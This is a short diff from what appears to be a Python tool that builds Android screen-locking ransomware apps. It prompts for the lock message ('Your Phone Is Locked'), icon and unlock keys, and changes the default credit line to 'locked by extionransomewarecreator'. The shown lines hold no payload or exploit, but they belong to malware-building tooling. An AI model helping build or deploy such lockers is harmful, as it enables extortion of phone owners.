@@ -426,7 +426,7 @@ class __extionrc__:
         head = str(input(f'         set app head: '))
         if not head: head = 'Your Phone Is Locked'
         desc = str(input(f'         set app desc: '))
-        if not desc: desc = 'locked by extionrc@termuxhackers-id'
+        if not desc: desc = 'locked by extionransomewarecreator'
         icon = str(input(f'         set app icon: '))
         if not os.path.isfile(icon): icon = 'data/tmp/icon.png'
         keys = str(input(f'         set app keys: '))
